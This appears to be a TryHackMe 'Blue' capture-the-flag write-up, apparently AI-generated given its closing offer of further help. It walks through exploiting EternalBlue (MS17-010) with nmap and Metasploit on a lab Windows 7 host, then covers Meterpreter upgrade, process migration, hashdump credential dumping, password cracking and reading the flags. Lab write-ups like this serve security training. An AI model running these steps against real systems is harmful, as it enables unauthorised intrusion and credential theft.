# 💻 TryHackMe: Blue Write-up

## 📌 Challenge Overview

* **Platform:** TryHackMe
* **Room:** Blue
* **Category:** Windows Exploitation
* **Objective:**
  Exploit the **EternalBlue (MS17-010)** vulnerability to gain SYSTEM access and perform post-exploitation tasks.

---

## 🔍 1. Reconnaissance

### 🛰️ Port Scanning

We begin with a full **Nmap scan**:

```bash id="3v4e8a"
nmap -sC -sV -p- -oN nmap/initial <TARGET_IP>
```

### 📊 Results

| Port | Service | Description    |
| ---- | ------- | -------------- |
| 135  | MSRPC   | Microsoft RPC  |
| 139  | NetBIOS | netbios-ssn    |
| 445  | SMB     | microsoft-ds   |
| 3389 | RDP     | Remote Desktop |

🖥️ OS Detected:

```id="yhfqg3"
Windows 7 Professional Service Pack 1
```

---

## 🛡️ Vulnerability Scanning

Since SMB (port 445) is open on an older Windows system, we check for **MS17-010**:

```bash id="h9okcb"
nmap --script smb-vuln-ms17-010 <TARGET_IP>
```

✅ Result:

```id="2q8o6y"
VULNERABLE → MS17-010 (EternalBlue)
```

---

## 💥 2. Exploitation (Initial Access)

### ⚙️ Launch Metasploit

```bash id="aqm3zt"
msfconsole
```

### 🔎 Search Exploit

```bash id="5ezdso"
search ms17-010
```

### 🎯 Select Module

```bash id="7q1i5g"
use exploit/windows/smb/ms17_010_eternalblue
```

### ⚙️ Configure Target

```bash id="r53bdg"
set RHOSTS <TARGET_IP>
```

### 🚀 Run Exploit

```bash id="39mw5w"
exploit
```

---

### 🎉 Result

```id="zqzv1l"
NT AUTHORITY\SYSTEM
```

✅ Full SYSTEM access achieved!

---

## 🔐 3. Post-Exploitation

### 🔄 Upgrade Shell (to Meterpreter)

Background current shell:

```bash id="cv6i2f"
background
```

Use upgrade module:

```bash id="k6m02u"
use post/multi/manage/shell_to_meterpreter
```

Check sessions:

```bash id="3t81oa"
sessions
```

Set session:

```bash id="k41q9k"
set SESSION 1
```

Run:

```bash id="8cxj9d"
run
```

Interact:

```bash id="v0sk9u"
sessions -i 2
```

---

### 🔁 Process Migration

List processes:

```bash id="9u8fmy"
ps
```

Migrate to stable process:

```bash id="7v4m3z"
migrate -N winlogon.exe
```

---

### 🔑 Credential Dumping

```bash id="e5r6p1"
hashdump
```

📌 Extracted users:

* Administrator
* Guest
* Jon

---

### 🔓 Password Cracking

Cracked Jon’s NTLM hash:

```id="3jfh1w"
Password: alqfna22
```

---

## 🏁 Finding the Flags

Use Meterpreter search:

```bash id="c4e9n8"
search -f flag*.txt
```

### 📍 Flag Locations

#### 🏳️ Flag 1

```bash id="f3i1z2"
C:\flag1.txt
```

#### 🏳️ Flag 2

```bash id="j8x2m9"
C:\Windows\System32\config\flag2.txt
```

#### 🏳️ Flag 3

```bash id="p2r7k1"
C:\Users\Jon\Documents\flag3.txt
```

---

### 📖 Read Flags

```bash id="x2w9pl"
cat C:\\flag1.txt
cat C:\\Windows\\System32\\config\\flag2.txt
cat C:\\Users\\Jon\\Documents\\flag3.txt
```

---

## 🧠 Key Takeaways

* **EternalBlue (MS17-010)** is a critical SMB vulnerability
* Always check SMB on older Windows systems
* Metasploit simplifies exploitation significantly
* Upgrade shells for better control (Meterpreter)
* Process migration improves shell stability
* Credential dumping enables lateral movement

---

## 🛠️ Tools Used

* Nmap
* Metasploit Framework
* Meterpreter
* John the Ripper / CrackStation

---

## 📚 References

* [https://tryhackme.com](https://tryhackme.com)
* [https://nvd.nist.gov/vuln/detail/CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
* [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)

---

## ✍️ Author

**Muhammad Taher**
Cyber Security Enthusiast | CTF Player

---

If you want, I can next:

* Combine **all 3 write-ups into one professional repo**
* Add **badges + screenshots + diagrams**
* Or make this into a **portfolio-ready GitHub project** 🔥
